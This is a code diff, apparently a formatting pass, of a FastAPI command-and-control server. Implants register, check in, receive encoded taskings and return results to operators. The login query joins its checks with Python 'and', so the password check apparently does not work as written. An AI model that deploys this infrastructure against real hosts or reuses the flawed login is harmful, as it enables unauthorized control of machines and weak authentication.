@@ -21,27 +21,46 @@ from server_helper.db import Base, SessionLocal
 from server_helper.db import get_db
 
 from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead
-from server_helper.tasking_helper import Tasking, TaskingCreate, TaskingRead, TaskingDelete
+from server_helper.tasking_helper import (
+    Tasking,
+    TaskingCreate,
+    TaskingRead,
+    TaskingDelete,
+)
 
-from server_helper.results_helper import Results, ResultsCreate, ResultsRead, ResultsDelete
-
+from server_helper.results_helper import (
+    Results,
+    ResultsCreate,
+    ResultsRead,
+    ResultsDelete,
+)
 
 app = FastAPI()
 
+
 # for client only to be able to access protected endpoints, authentication via OAuth2
 @app.post("/token/", response_model=Token)
-def login(db: SessionLocal = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()): # type: ignore
-    user_exists = db.query(Users).filter(Users.username == form_data.username and Users.password == form_data.password).first()
+def login(db: SessionLocal = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()):  # type: ignore
+    user_exists = (
+        db.query(Users)
+        .filter(
+            Users.username == form_data.username
+            and Users.password == form_data.password
+        )
+        .first()
+    )
     if not user_exists:
         raise HTTPException(status_code=401, detail="Invalid username or password")
     access_token = create_access_token(data={"sub": form_data.username})
     return {"access_token": access_token, "token_type": "bearer"}
 
 
-# for clients only to get jwt token upon successful login 
+# for clients only to get jwt token upon successful login
 def create_access_token(data: dict, expires_delta: timedelta | None = None):
     to_encode = data.copy()
-    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
+    expire = datetime.now(timezone.utc) + (
+        expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
+    )
     to_encode.update({"exp": expire})
     encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
     return encoded_jwt
@@ -50,23 +69,23 @@ def create_access_token(data: dict, expires_delta: timedelta | None = None):
 # for clients only to verify the token is correct and valid still
 def verify_token(token: str, Depends=(oauth2_scheme)):
     credentials_exception = HTTPException(
-            status_code = status.HTTP_401_UNAUTHORIZED,
-            detail="Bad credentials",
-            headers={"WWW-Authenticate": "Bearer"},
-            )
+        status_code=status.HTTP_401_UNAUTHORIZED,
+        detail="Bad credentials",
+        headers={"WWW-Authenticate": "Bearer"},
+    )
     try:
         payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
         username: str = payload.get("sub")
         if username is None:
             raise credentials_exception
-        return payload 
+        return payload
     except JWTError:
         raise credentials_exception
 
 
 # PROTECTED endpoint to view all information about all users
 @app.get("/users", response_model=List[UserRead])
-def read_users(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def read_users(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     users = db.query(Users).all()
     return users
@@ -74,7 +93,7 @@ def read_users(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_
 
 # PROTECTED endpoint to view all information about a user
 @app.get("/users/{user_id}", response_model=UserRead)
-def read_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def read_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     user = db.query(Users).filter(Users.id == user_id).first()
     if user is None:
@@ -84,7 +103,7 @@ def read_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Sec
 
 # PROTECTED endpoint to create a new user
 @app.post("/users/create", response_model=UserCreate)
-def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     existing_user = db.query(Users).filter(Users.username == user.username).first()
     if existing_user:
@@ -99,7 +118,7 @@ def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), token: str
 
 # PROTECTED endpoint to delete a user
 @app.delete("/users/delete/{user_id}", response_model=UserDelete)
-def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     db_user = db.query(Users).filter(Users.id == user_id).first()
     if db_user is None:
@@ -111,12 +130,14 @@ def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = S
 
 # PROTECTED endpoint for clients to retrieve result based on session id and tasking id
 @app.get("/results/{session}/{id}", response_model=ResultsRead)
-def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if not db_implant:
         raise HTTPException(status_code=404, detail="Session not found")
-    db_result = db.query(Results).filter(Results.session == session, Results.id == id).first()
+    db_result = (
+        db.query(Results).filter(Results.session == session, Results.id == id).first()
+    )
     if db_result is None:
         raise HTTPException(status_code=416, detail="Result out of range")
     return db_result
@@ -124,7 +145,7 @@ def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), token
 
 # recieve tasking output from agent based on session id, marks task complete = True
 @app.post("/results/{session}", response_model=ResultsCreate)
-def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depends(get_db)): # type: ignore
+def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depends(get_db)):  # type: ignore
     current_time = datetime.now(timezone.utc).isoformat()
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if not db_implant:
@@ -132,7 +153,7 @@ def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depe
     if results.args:
         try:
             args_bytes = bytes.fromhex(results.args)
-            decoded_args = base64.b64decode(args_bytes.decode('utf-8')).decode('utf-8')
+            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
         except (binascii.Error, UnicodeDecodeError, ValueError) as e:
             raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
     else:
@@ -145,7 +166,11 @@ def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depe
     db.commit()
     db.refresh(db_task)
     # Mark the task as complete (break this out into its own function later)
-    db_tasking = db.query(Tasking).filter(Tasking.session == session, Tasking.id == results.tasking_id).first()
+    db_tasking = (
+        db.query(Tasking)
+        .filter(Tasking.session == session, Tasking.id == results.tasking_id)
+        .first()
+    )
     if db_tasking:
         db_tasking.complete = "True"
         db.commit()
@@ -154,7 +179,6 @@ def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depe
         print("Task not found, cannot update completion status in the tasking table.")
         raise HTTPException(status_code=404, detail="Task not found")
     return db_task
-
 
 
 # PROTECTED endpoint in order to create a task for an implant (client -> server)
@@ -171,7 +195,7 @@ def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depe
     if tasking.args:
         try:
             args_bytes = bytes.fromhex(tasking.args)
-            decoded_args = base64.b64decode(args_bytes.decode('utf-8')).decode('utf-8')
+            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
         except (binascii.Error, UnicodeDecodeError, ValueError) as e:
             raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
     else:
@@ -181,33 +205,48 @@ def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depe
     # Override 'args' with decoded version
     tasking_data["args"] = decoded_args
     # Create new task
-    db_task = Tasking(**tasking_data, session=session, date=current_time, complete="False")
+    db_task = Tasking(
+        **tasking_data, session=session, date=current_time, complete="False"
+    )
     db.add(db_task)
     db.commit()
     db.refresh(db_task)
     return db_task
 
 
-# PROTECTED endpoint for client to retrieve taskings 
+# PROTECTED endpoint for client to retrieve taskings
 @app.get("/tasking/{session}", response_model=List[TaskingRead])
-def read_taskings(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def read_taskings(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if not db_implant:
         raise HTTPException(status_code=404, detail="Session not found")
-    
-    tasking = db.query(Tasking).filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending", "True"])).all()
-    return tasking
 
+    tasking = (
+        db.query(Tasking)
+        .filter(
+            Tasking.session == session,
+            Tasking.complete.in_(["False", "Pending", "True"]),
+        )
+        .all()
+    )
+    return tasking
 
 
 # endpoint for agent initial checkin, register with server for future tasking/results/tracking
 @app.post("/implants/", response_model=ImplantRead)
-def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): # type: ignore
+def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)):  # type: ignore
     current_time = datetime.now(timezone.utc).isoformat()
-    
-    implant_data = implant.model_dump(exclude={"alive", "first_checkin", "last_checkin"})
-    db_implant = Implant(**implant_data, alive=True, first_checkin=current_time, last_checkin=current_time)
+
+    implant_data = implant.model_dump(
+        exclude={"alive", "first_checkin", "last_checkin"}
+    )
+    db_implant = Implant(
+        **implant_data,
+        alive=True,
+        first_checkin=current_time,
+        last_checkin=current_time,
+    )
 
     db.add(db_implant)
     db.commit()
@@ -217,7 +256,7 @@ def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): 
 
 # PROTECTED endpoint for clients only to be able to view all implants
 @app.get("/implants/", response_model=List[ImplantRead])
-def read_implants(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def read_implants(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     implants = db.query(Implant).all()
     return implants
@@ -225,20 +264,22 @@ def read_implants(db: SessionLocal = Depends(get_db), token: str = Security(oaut
 
 # PROTECTED endpoint for clients to be able to view a single implant by session
 @app.get("/implants/{session}", response_model=ImplantRead)
-def read_single_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+def read_single_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     verify_token(token)
     implant = db.query(Implant).filter(Implant.session == session).first()
     if implant is None:
         raise HTTPException(status_code=404, detail="Session not found")
-    # check if alive 
+    # check if alive
     if not implant.alive:
-        raise HTTPException(status_code=410, detail="Implant is dead or has been killed")
+        raise HTTPException(
+            status_code=410, detail="Implant is dead or has been killed"
+        )
     return implant
 
 
 # endpoint for agent to deregister itself, mark as dead (agent makes best effort to call endpoint when sudden death occurs)
 @app.get("/health/d/{session}", response_model=ImplantCreate)
-def deregister_implant(session: str, db: SessionLocal = Depends(get_db)): # type: ignore 
+def deregister_implant(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if db_implant is None:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -252,7 +293,7 @@ def deregister_implant(session: str, db: SessionLocal = Depends(get_db)): # type
 
 # implant checkin endpoint
 @app.get("/health/{session}", response_model=ImplantCreate)
-def check_in(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
+def check_in(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
     check_in_time = datetime.now(timezone.utc).isoformat()
 
     db_implant = db.query(Implant).filter(Implant.session == session).first()
@@ -262,7 +303,11 @@ def check_in(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
     db.commit()
     db.refresh(db_implant)
 
-    pending_tasks = db.query(Tasking).filter(Tasking.session == session, Tasking.complete == "False").all()
+    pending_tasks = (
+        db.query(Tasking)
+        .filter(Tasking.session == session, Tasking.complete == "False")
+        .all()
+    )
 
     if pending_tasks:
         return RedirectResponse(f"/tasks/{session}", status_code=301)
@@ -273,12 +318,16 @@ def check_in(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
 
 # endpoint for agent to retrieve tasks, mark them as pending after agent picks them up
 @app.get("/tasks/{session}", response_model=List[TaskingRead])
-def get_tasks(session: str, db: SessionLocal = Depends(get_db)):    # type: ignore
+def get_tasks(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if db_implant is None:
         raise HTTPException(status_code=404, detail="Session not found")
-    
-    tasking = db.query(Tasking).filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending"])).all()
+
+    tasking = (
+        db.query(Tasking)
+        .filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending"]))
+        .all()
+    )
     if not tasking:
         raise HTTPException(status_code=404, detail="No tasks found for this session")
     # Mark tasks as pending
